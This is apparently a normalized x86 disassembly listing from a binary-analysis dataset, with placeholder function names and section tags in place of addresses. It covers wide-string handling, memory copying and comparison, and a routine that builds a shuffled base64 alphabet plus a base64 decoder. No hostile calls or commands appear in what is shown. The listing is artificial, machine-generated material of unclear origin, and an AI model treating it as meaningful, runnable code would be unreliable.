sar eax 0x1
push eax
push edx
mov ecx esi
call sub_408240
pop esi
pop ebp
retn 0x4
sub_408080
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_41685b
mov edx [ ebp + 0xc ]
mov eax edi
sub eax ecx
cmp eax edx
ja r-xdata
test edx edx
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
mov [ eax + ecx * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
pop ebx
jb r-xdata
add eax eax
push eax
lea eax [ ebx + edx * 2 ]
push eax
push ebx
call sub_4170d0
add esp 0xc
sub edi edx
push ebx
lea ebx [ eax + ecx * 2 ]
mov eax edi
sub eax ecx
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub_408130
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
test esi esi
jne r-xdata
push ebx
mov ebx [ ecx + 0x10 ]
push edi
test ebx ebx
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0xc
pop edi
pop ebx
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp esi ebx
ja r-xdata
mov eax 0x1
sub eax esi
add ebx eax
mov eax [ ecx + 0x14 ]
mov [ ebp - 0xc ] eax
cmp eax 0x8
jb r-xdata
mov eax ecx
mov [ ebp - 0x4 ] ecx
nop
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ecx ebx
movzx edx [ edx ]
lea esp [ esp ]
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov edx [ ebp + 0x8 ]
mov edi esi
mov esi eax
jbe r-xdata
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
cmp [ ebp - 0xc ] 0x8
mov ecx [ ebp - 0x8 ]
jb r-xdata
mov edi edi
cmp [ eax ] dx
je r-xdata
pop edi
sub eax ecx
pop ebx
sar eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
movzx ecx [ esi ]
cmp cx [ edx ]
sbb ecx ecx
and ecx 0xfffffffe
inc ecx
je r-xdata
add esi 0x2
add edx 0x2
dec edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov edx eax
sub edx [ ebp - 0x4 ]
or ecx 0xffffffff
sar edx 0x1
sub ecx edx
add ebx ecx
add eax 0x2
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov cx [ esi ]
cmp cx [ edx ]
jne r-xdata
sub_408210
push ebp
mov ebp esp
cmp [ ecx + 0x14 ] 0x8
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] edx
jb r-xdata
xor eax eax
mov [ ecx + edx * 2 ] ax
pop ebp
retn 0x4
mov eax [ ecx ]
xor ecx ecx
mov [ eax + edx * 2 ] cx
pop ebp
retn 0x4
sub_408240
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0x7ffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_408520
test edi edi
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x8
jb r-xdata
mov eax [ esi + 0x10 ]
lea eax [ edx + eax * 2 ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
lea eax [ edi + edi ]
push eax
push ebx
push ecx
call sub_41a1a0
add esp 0xc
test edi edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub ebx eax
sar ebx 0x1
push ebx
push esi
mov ecx esi
call sub_408340
pop esi
pop ebx
pop ebp
retn 0x8
sub_408340
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp edi ecx
jb r-xdata
push r--data
call sub_41685b
sub edi ecx
cmp [ ebp + 0x10 ] edi
cmovb edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
cmp edi 0x7ffffffe
ja r-xdata
lea eax [ edi + ecx ]
cmp [ esi + 0x10 ] eax
jb r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_41685b
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
jb r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_408520
mov ecx [ ebp + 0xc ]
test edi edi
je r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
xor edi edi
push ecx
push edi
mov ecx esi
mov [ edx + eax * 2 ] di
call sub_408080
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebx ]
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
lea eax [ edi + edi ]
push eax
lea eax [ ebx + ecx * 2 ]
push eax
push edx
call sub_41a1a0
add esp 0xc
test edi edi
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
sub_408460
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0x7ffffffe
ja r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esi + 0x10 ]
push edi
call sub_408520
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
test edi edi
jne r-xdata
cmp edi 0x8
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
push ebx
mov ebx [ esi + 0x10 ]
cmp edi ebx
cmovb ebx edi
cmp eax 0x8
jb r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
xor eax eax
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] 0x7
mov [ esi + ebx * 2 ] ax
cmp eax edi
pop ebx
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
mov ecx [ esi ]
mov [ ebp + 0xc ] ecx
test ebx ebx
je r-xdata
push ecx
call j_sub_417912#2
add esp 0x4
lea eax [ ebx + ebx ]
push eax
push ecx
push esi
call sub_41a1a0
mov ecx [ ebp + 0xc ]
add esp 0xc
sub_408520
push ebp
mov ebp esp
push 0xffffffff
push sub_430210
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x18 ] esi
mov eax [ ebp + 0x8 ]
mov edi eax
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
mov ebx [ esi + 0x14 ]
mov eax 0xaaaaaaab
mul edi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov edi eax
jmp r-xdata
lea eax [ edi + 0x1 ]
xor ecx ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] ecx
test eax eax
je r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea edi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp eax 0x7fffffff
ja r-xdata
mov edi 0x7ffffffe
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
call sub_4167fc
add eax eax
push eax
call sub_41775f
mov ecx eax
add esp 0x4
mov [ ebp - 0x14 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x8
jb r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
mov edx esi
mov edx [ esi ]
jmp r-xdata
xor eax eax
mov [ esi + ebx * 2 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
lea eax [ ebx + ebx ]
push eax
push edx
push ecx
call sub_41a1a0
add esp 0xc
test ebx ebx
je r-xdata
sub_4085fb
mov esi [ ebp - 0x18 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor eax eax
push eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push eax
mov [ esi ] ax
call sub_41a87b
mov edx esi
test ebx ebx
je r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea eax [ ebx + ebx ]
push eax
push edx
push ecx
call sub_41a1a0
add esp 0xc
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x8
jb r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ esi + ebx * 2 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
sub_408680
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x4
cmp eax 0x7fffffff
ja r-xdata
call sub_4167fc
add eax eax
push eax
call sub_41775f
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
sub_4086b0
push esi
mov esi ecx
mov eax 0x41
mov edx rw-data
lea ecx [ ecx ]
mov [ edx + eax - 0x41 ] al
inc eax
cmp eax 0x4b
jle r-xdata
mov [ rw-data ] 0x2b
mov eax 0xc
mov ecx 0x61
jmp r-xdata
mov [ eax + rw-data ] cl
inc ecx
inc eax
cmp ecx 0x6b
jle r-xdata
mov [ eax + rw-data ] 0x2f
inc eax
mov ecx 0x30
lea ebx [ ebx ]
mov [ eax + rw-data ] cl
inc ecx
inc eax
cmp ecx 0x39
jle r-xdata
mov ecx 0x6c
mov [ eax + rw-data ] cl
inc ecx
lea eax [ eax + 0x1 ]
cmp ecx 0x7a
jle r-xdata
mov ecx 0x4c
lea eax [ eax + rw-data ]
lea esp [ esp ]
mov [ eax ] cl
inc ecx
lea eax [ eax + 0x1 ]
cmp ecx 0x5a
jle r-xdata
mov eax esi
pop esi
retn
sub_408740
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax ecx
cdq
sub esp 0xc
and edx 0x3
add eax edx
sar eax 0x2
push ebx
push esi
lea esi [ eax + eax * 2 ]
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
xor ebx ebx
cmp [ eax + ecx - 0x1 ] 0x3d
mov edx 0x1
cmove edi edx
cmp [ eax + ecx - 0x2 ] 0x3d
jne r-xdata
cmp [ eax + ecx - 0x3 ] 0x3d
jne r-xdata
inc edi
cmp edi 0x3
ja r-xdata
inc edi
push esi
call sub_41794a
add esp 0x4
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
jmp [ edi * 4 + jump_table_40886c ]
push r--data
call sub_418546
add esp 0x4
push 0x0
call sub_418980
mov edi edi
mov al [ edi - 0x7875ffc0 ]
inc eax
add [ edi - 0x6bffbf79 ] cl
xchg [ eax ] eax
int3
push esi
push 0x0
push eax
call sub_41cae0
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
sub ecx edi
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] ecx
test ecx ecx
jle r-xdata
add esi 0x4
jmp r-xdata
add esi 0x3
jmp r-xdata
add esi 0x2
pop edi
pop esi
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ecx ]
mov eax 0x4
sub eax edi
mov [ ebp - 0x8 ] ebx
lea ecx [ eax + eax * 2 ]
mov eax [ ebp - 0x4 ]
add ecx ecx
shl esi cl
xor edx edx
lea ecx [ edx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov al [ ebx + eax ]
movsx eax al
push eax
push rw-data
call sub_4189a0
mov ecx rw-data
sub al cl
mov ecx [ ebp + 0xc ]
movsx eax al
shl esi 0x6
inc edi
add esp 0x8
or esi eax
inc ebx
cmp edi 0x4
jl r-xdata
mov ebx [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
cmp ebx ecx
jl r-xdata
mov ebx [ ebp - 0x4 ]
mov eax esi
sar eax cl
sub ecx 0x8
inc edx
mov [ ebx ] al
mov eax ebx
inc eax
mov [ ebp - 0x4 ] eax
cmp ecx 0xfffffff8
jg r-xdata
cmp ebx ecx
jge r-xdata
xor edi edi
xor esi esi
cmp edx edi
je r-xdata
sub_408880
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebp
retn
sub esi 0x4
jb r-xdata
cmp esi 0xfffffffc
je r-xdata
mov eax [ ecx ]
cmp eax [ edx ]
jne r-xdata
mov al [ ecx ]
cmp al [ edx ]
jne r-xdata
add ecx 0x4
add edx 0x4
sub esi 0x4
jae r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0xfffffffd
je r-xdata
mov al [ ecx + 0x1 ]
cmp al [ edx + 0x1 ]
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
mov al [ ecx + 0x2 ]
cmp al [ edx + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov al [ ecx + 0x3 ]
cmp al [ edx + 0x3 ]
je r-xdata
sub_4088e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_418b71
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
sub_408920
push ebp
mov ebp esp
push 0xffffffff
push sub_43045a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x18 ] esi
call sub_4168c1
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x18 ] ax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] ax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] al
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] al
mov [ ebp - 0x4 ] 0x6
test edi edi
jne r-xdata
push edi
push esi
call sub_416b58
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x24 ] r--data
call sub_41a87b
sub_4089f0
push esi
mov esi ecx
push esi
call sub_416ba3
mov eax [ esi + 0x2c ]
add esp 0x4
test eax eax
je r-xdata
mov [ esi + 0x2c ] 0x0
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call sub_417912
add esp 0x4
mov [ esi + 0x24 ] 0x0
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call sub_417912
add esp 0x4
mov [ esi + 0x1c ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_417912
add esp 0x4
mov [ esi + 0x14 ] 0x0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_417912
add esp 0x4
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_417912
add esp 0x4
mov [ esi + 0x4 ] 0x0
mov ecx esi
pop esi
jmp sub_41691d
push eax
call sub_417912
add esp 0x4
sub_408ab0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
sub_408b40
push ebp
mov ebp esp
push 0xffffffff
push sub_4307cb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test edi edi
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi ] ebx
jne r-xdata
push 0x18
call sub_41775f
mov esi eax
add esp 0x4
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x54 ]
call sub_4089f0
mov eax [ ecx + 0x18 ]
test eax eax
jne r-xdata
mov eax r--data
jmp r-xdata
push eax
lea ecx [ ebp - 0x54 ]
call sub_408920
lea eax [ ebp - 0x20 ]
push eax
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_416c4d
movq xmm0 [ eax ]
movq [ esi + 0x8 ] xmm0
movq xmm0 [ eax + 0x8 ]
add esp 0x4
movq [ esi + 0x10 ] xmm0
jmp r-xdata
lea eax [ ecx + 0x1c ]
mov [ edi ] esi
test bl 0x1
je r-xdata
sub_408c30
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
lea ebx [ ecx + 0x8 ]
movzx eax [ esi ]
push ebx
push eax
call sub_416cb9
mov [ esi ] al
inc esi
add esp 0x8
cmp esi edi
jne r-xdata
pop ebx
sub_408c80
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
lea ebx [ ecx + 0x8 ]
movzx eax [ esi ]
push ebx
push eax
call sub_416db6
mov [ esi ] al
inc esi
add esp 0x8
cmp esi edi
jne r-xdata
pop ebx
sub_408cc0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
push edx
push [ ebp + 0x10 ]
call sub_41a1a0
mov eax [ ebp + 0xc ]
add esp 0xc
pop ebp
retn 0xc
sub_408cf0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
push edx
push [ ebp + 0x14 ]
call sub_41a1a0
mov eax [ ebp + 0xc ]
add esp 0xc
pop ebp
retn 0x10
sub_408d10
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
push [ esi + 0xc ]
call sub_417912
jmp r-xdata
push [ esi + 0x14 ]
call sub_417912
add esp 0x4
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push [ esi + 0xc ]
call j_sub_417912
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
sub_408d70
push ebp
mov ebp esp
push 0xffffffff
push sub_430488
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0xf
cmp [ edx ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x24 ] 0x0
jne r-xdata
mov eax edx
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ ebp - 0x24 ]
call sub_401630
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
mov esi [ eax ]
mov edi [ eax + 0x4 ]
cmp [ ebp - 0x10 ] 0x10
lea eax [ ebp - 0x24 ]
cmovae eax [ ebp - 0x24 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
mov ecx ebx
call sub_418b0e
cmp [ ebp - 0x10 ] 0x10
mov [ ebx ] r--data
mov [ ebx + 0xc ] esi
mov [ ebx + 0x10 ] edi
jb r-xdata
mov eax ebx
mov [ ebx ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp - 0x24 ]
call j_sub_417912#2
add esp 0x4
sub_408e40
push ebp
mov ebp esp
sub esp 0x24
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x0
push 0x0
call sub_41a87b
mov eax [ ecx + 0x10 ]
and eax [ ecx + 0xc ]
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] rw-data
lea ecx [ ebp - 0x20 ]
test al 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push r--data
call sub_408d70
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_41a87b
test al 0x2
lea eax [ ebp - 0xc ]
push eax
jne r-xdata
push r--data
call sub_408d70
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_41a87b
jmp r-xdata
push r--data
call sub_408d70
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_41a87b
int3
sub_408ed0
push ebp
mov ebp esp
mov eax [ ecx + 0x30 ]
push esi
mov ecx [ eax ]
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
mov edx [ ecx ]
call [ edx + 0x4 ]
mov eax esi
pop esi
pop ebp
retn 0x4
sub_408ef0
push ecx
push esi
mov esi ecx
push edi
push 0x4
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x2c ] 0x0
mov [ esi + 0xc ] 0x0
call sub_41775f
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop edi
mov [ esi + 0x30 ] 0x0
pop esi
pop ecx
retn
push 0x1
mov [ edi ] 0x0
call sub_416a83
mov [ edi ] eax
add esp 0x4
mov [ esi + 0x30 ] edi
pop edi
pop esi
pop ecx
retn
sub_408f80
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov edi ecx
call sub_418b4e
mov [ edi ] r--data
mov eax [ esi + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov [ edi ] r--data
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
sub_408fb0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov edi ecx
call sub_418b4e
mov [ edi ] r--data
mov eax [ esi + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
sub_408fe0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_416ed8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
sub_409040
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xf
cmp [ ecx ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x18 ] 0x0
jne r-xdata
mov edx ecx
lea esi [ edx + 0x1 ]
lea ecx [ ecx ]
xor edx edx
jmp r-xdata
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx esi
push edx
push ecx
lea ecx [ ebp - 0x18 ]
call sub_401630
lea esi [ edi + 0x4 ]
lea eax [ ebp - 0x18 ]
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x1c ] 0x1
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x1c
push [ ebp - 0x18 ]
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_40c7e0
push [ esi ]
call j_sub_417912#2
add esp 0x4
sub_4090e0
xor eax eax
mov [ rw-data ] ax
mov [ rw-data ] eax
mov [ rw-data ] ax
mov [ rw-data ] eax
mov [ rw-data ] ax
mov [ rw-data ] eax
mov [ rw-data ] ax
mov [ rw-data ] eax
mov [ rw-data ] ax
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] 0x7
mov [ rw-data ] 0x7
mov [ rw-data ] 0x7
mov [ rw-data ] 0x7
mov eax rw-data
retn
sub_409160
cmp [ rw-data ] 0x8
jb r-xdata
xor eax eax
cmp [ rw-data ] 0x8
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
jb r-xdata
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ rw-data ] 0x8
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
jb r-xdata
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ rw-data ] 0x8
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
jb r-xdata
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ rw-data ] 0x8
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
jb r-xdata
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
retn
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
sub_409260
push ebp
mov ebp esp
push 0xffffffff
push sub_43065c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x514
mov eax [ rw-data ]
